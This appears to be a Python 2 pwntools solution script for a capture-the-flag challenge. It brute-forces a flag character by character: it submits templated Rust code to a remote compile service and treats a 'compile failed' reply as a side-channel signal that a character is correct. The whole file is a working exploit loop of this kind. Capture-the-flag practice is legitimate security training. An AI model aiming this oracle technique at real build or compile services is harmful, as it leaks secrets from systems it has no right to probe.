#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2019 hzshang <hzshang15@gmail.com>
#
# Distributed under terms of the MIT license.
from pwn import *
import string
context.log_level="error"
flag = ""#sys.argv[1] : ""


while True:
    print "flag:",flag
    for i in "flag{}"+string.printable[::-1]:
        print "try:",i
        r = remote("ruscas2.r3kapig.com",50806)
        code = read("./rustc.rs")
        code = code%(ord(i))
        r.recvuntil("EOF")
        print "connect done"
        r.sendline(code)
        r.sendline("EOF")
        data= r.recvline()
        r.recvline()
        data= r.recvline()
        print data
        if "compile failed" in data:
            # error
            print "found",i
            flag +=i
            r.close()
            break
        else:
            r.close()
        



